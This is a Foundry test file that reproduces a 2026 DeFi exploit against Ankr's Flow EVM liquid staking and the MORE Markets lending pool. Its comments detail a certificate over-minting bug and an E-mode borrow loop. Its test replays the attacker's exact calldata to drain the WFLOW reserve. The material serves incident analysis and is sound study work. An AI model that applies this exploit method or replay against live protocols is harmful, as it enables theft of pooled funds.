// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Ankr Liquid Staking (ankrFLOW) -> MORE Markets, on Flow EVM (chainId 747), 2026-08-31.
// ~15,488,124 WFLOW drained from the MORE Markets WFLOW reserve (~$410K at the WFLOW spot
// price on the day). The attacker contract kept 9,819,641 native FLOW.
//
// Exploit tx : 0x2b2e6ea6cc7dabeec83941abfdc22dd7fa53a58f327af0fccb73a0ed8a3f66c9 (block 76986328)
//   A single CALL from the attacker EOA to its already-deployed attack contract (selector
//   0xf0328c24). The attack contract was created in an earlier tx
//   (0xca9cf3f465...), so at fork block-1 it is already on-chain and is invoked here with its
//   exact original calldata (hardcoded below, no reconstruction of its opaque logic). The
//   attack contract is unverified; the ROOT CAUSE below is derived independently from Ankr's
//   own verified source, not from the attacker bytecode.
//
// Root cause (reproducible contract logic, NOT a key/signer/oracle-signer/admin compromise):
//   Ankr's dual-token liquid staking keeps two tokens for staked FLOW:
//     - ankrFLOWEVM  (CertificateToken, cert)  value-accruing, ratio-priced. At the exploit
//                    block the certificate ratio was 0.833437e18, i.e. 1 cert ~= 1.19985 FLOW.
//     - aFLOWEVMb    (BearingToken, bond)      rebasing, pegged 1:1 to FLOW (bond ratio 1e18).
//
//   The staking pool (FlowStakingPool, proxy 0xFE81..287a, impl 0x213A..f5A6, extending
//   Ankr's LiquidTokenStakingPool) mints the certificate that backs a freshly staked bond
//   using the BOND share count instead of the CERTIFICATE share count:
//
//     LiquidTokenStakingPool.sol
//       _stakeBonds(staker, amount)                                    // L145-149
//         uint256 shares = _bearingToken.bondsToShares(amount);       // L146  bond ratio 1e18 -> shares == amount
//         _stake(staker, amount, shares, true);
//       _stake(staker, amount, shares, isRebasing)                    // L151-166
//         _certificateToken.mint(address(_bearingToken), shares);     // L163  mints `shares` CERTIFICATE
//         _bearingToken.mint(staker, shares);                         // L164
//
//   Because `shares` is bond-denominated (1:1 with the deposited FLOW), staking `v` FLOW as a
//   bond mints `v` certificate tokens to back it. But `v` certificate is worth v/0.833437 =
//   ~1.19985*v FLOW, so the bond is over-backed with ~20% excess certificate value out of thin
//   air. The correct path, _stakeCerts (L138-143), uses `_certificateToken.bondsToShares(amount)`
//   (the certificate ratio) and mints only `v * ratio` cert - the bond path omits that scaling.
//
//   Extraction: BearingToken.unlockShares (bond token, impl 0xD70C..cee4) burns the bond and
//   hands the caller that same over-minted certificate 1:1. The certificate is then valued at
//   its true ~1.2x ratio everywhere downstream.
//
//   Amplifier (the "E-mode lever"): MORE Markets is an Aave-V3 fork. Both ankrFLOWEVM and WFLOW
//   sit in E-mode category 1 ("Wrapped native tokens") with a 97% LTV. The attacker supplies the
//   over-minted certificate as E-mode collateral, borrows WFLOW near the certificate's inflated
//   oracle value, wraps/unwraps and re-stakes, and loops - each round nets WFLOW because
//   0.97 * ~1.2 > 1 - until the WFLOW reserve is empty. Ankr's own FLOW reserve (only ~52,315
//   FLOW at the block) is never the bottleneck; the value is manufactured by the mint bug and
//   cashed out of MORE's WFLOW reserve.
//
//   Every call in the path is permissionless: uniswapV3 flash, stakeBonds/stakeCerts/unstakeCerts,
//   BearingToken.unlockShares, and MORE supply/borrow/setUserEMode. No owner key, no admin role.
//
// Addresses (Flow EVM):
//   Attacker EOA        : 0xa1E4B05F9A0425136045D8fC8A4978B25bB6A7Cc
//   Attack contract     : 0xA0C2fe72aD9b640994A9c4252F25Fb058DDb3702 (unverified, entry 0xf0328c24)
//   ankrFLOWEVM (cert)  : 0x1b97100eA1D7126C4d60027e231EA4CB25314bdb  (impl 0x544bC63D..7964)
//   aFLOWEVMb  (bond)   : 0xd6Fd021662B83bb1aAbC2006583A62Ad2Efb8d4A  (impl 0xD70C8AaC..cee4)
//   FlowStakingPool     : 0xFE8189A3016cb6A3668b8ccdAC520CE572D4287a  (impl 0x213A1525..f5A6)
//   WFLOW               : 0xd3bF53DAC106A0290B0483EcBC89d40FcC961f3e
//   UniV3 cert/WFLOW    : 0xbB577ac54E4641a7e2b38Ce39e794096CD11A639  (flash source, fee 0.01%)
//   MORE Markets pool   : 0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d  (Aave V3 fork)
//   MORE WFLOW aToken   : 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059  (the drained reserve)
//
// Run:
//   forge test --contracts ./src/test/2026-08/AnkrMORE_exp.sol --evm-version cancun -vvv
//   The --evm-version cancun flag is required: the repo default is 'shanghai', but the attack
//   contract's bytecode uses Cancun opcodes (Flow EVM runs a Cancun-or-later spec); replaying it
//   under shanghai reverts with EvmError: NotActivated. Uses a direct Flow EVM archive RPC in the
//   fork call below; no rpc alias or env var needed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract AnkrMOREExp is Test {
    address constant ATTACKER_EOA = 0xa1E4B05F9A0425136045D8fC8A4978B25bB6A7Cc;
    address constant ATTACK_CONTRACT = 0xA0C2fe72aD9b640994A9c4252F25Fb058DDb3702;
    address constant WFLOW = 0xd3bF53DAC106A0290B0483EcBC89d40FcC961f3e;
    address constant MORE_WFLOW_ATOKEN = 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059;

    uint256 constant EXPLOIT_BLOCK = 76_986_328;

    // Public Flow EVM RPC. Serves archive state at the fork block (verified: WFLOW totalSupply
    // and this reserve balance read cleanly at block-1).
    string constant FLOW_RPC = "https://mainnet.evm.nodes.onflow.org";

    // Exact input of the exploit tx (selector 0xf0328c24 + args), verbatim, no 0x prefix.
    bytes constant EXPLOIT_CALLDATA =
        hex"f0328c247c738e10143e6cbb2d953947f56bd3ec7e9855fe99ed6e6ca3221c859edb12f5a549355cc93e064c5ddcf54e220450dcd0f6a527c3812ac1e44b7aeb20f4d61bf47a887068e84e69c062ebdd6fa5a3691fcf5df9824ed7460da1657cead254c2ba2869d12d9cf45a3f7ff1b5c9260aa349ca94564a50a8dfcbb325e39f1e6819baf7dc7343528eebd0b08c380d6fed73b7714908f49aff5af2fca4f7d579e54c6905b741ce3b4384433091acde98dfca3d51fb0ac6debbd96a9874e75131bb492f37a606813ece6249a7572c7bbc5530ba851a85ed5caafadfd83e39e72b451c530a7d5da79eb2877f5a634537e29e8a797e8888c8a36cec2102f8aab84c5499c659cbead8986491f6b80c1dca0d2beb10b95a9be74fc28a7cd1b4ca8b3ac4c6225ff89b901b0baeab1ecda170168c9fc63335d4fe6dc1202432620e1099457714c3a0343cc7b72ecf128d1c9b0f649c3d985956a1e3d696f5ee2016c89e2603ee431d31564b6c16f408b57259fa2833c2d8d0df8d0a4685328cd41b588d8eed328ea696948d9cb975da47d293de22db3246ca160c545afede9d09b7f0b51d8d34216e5eea2690fd7f2bfa8f185e0d1b1a144936654989c2abc92c1dcc7c7e6f5047c39e0eef127f3a55d3518e387e156ff5da896d5662707e61a4cdfec9f107be784f4e66e7486e22b1059135bc02f96e8cf99a9fd211dc5efe1c5c58125208be0ee8328cf536ff2cb5138cf6e04f055563bb70f0d21be01ed1ffbf8c0b1453ea96548c9c5a5949b3440901a32e81ea0a37e25d33d34f1fe3a6d0d9ee543d80f2e45372c4185ed343a8018aa79ff8926c6bad3f81101bf91d387ef9";

    function setUp() public {
        // Fork one block before the exploit. The attack contract is already deployed here.
        vm.createSelectFork(FLOW_RPC, EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        uint256 reserveBefore = IERC20(WFLOW).balanceOf(MORE_WFLOW_ATOKEN);
        emit log_named_decimal_uint("MORE WFLOW reserve before", reserveBefore, 18);

        // msg.sender AND tx.origin = attacker EOA, matching the original single call.
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        (bool ok,) = ATTACK_CONTRACT.call(EXPLOIT_CALLDATA);
        vm.stopPrank();
        require(ok, "exploit replay reverted");

        uint256 reserveAfter = IERC20(WFLOW).balanceOf(MORE_WFLOW_ATOKEN);
        uint256 drained = reserveBefore - reserveAfter;
        emit log_named_decimal_uint("MORE WFLOW reserve after ", reserveAfter, 18);
        emit log_named_decimal_uint("MORE WFLOW reserve drained", drained, 18);
        emit log_named_decimal_uint("Attack contract FLOW kept ", ATTACK_CONTRACT.balance, 18);

        // Aggregate drain of the WFLOW reserve: 15,488,124 WFLOW -> 0.
        assertApproxEqAbs(drained, 15_488_124 ether, 10_000 ether, "WFLOW reserve not drained ~15.5M");
        // Native FLOW the attack contract walked away with (the final borrow, unwrapped).
        assertGt(ATTACK_CONTRACT.balance, 9_000_000 ether, "attacker FLOW profit below ~9.8M");
    }
}
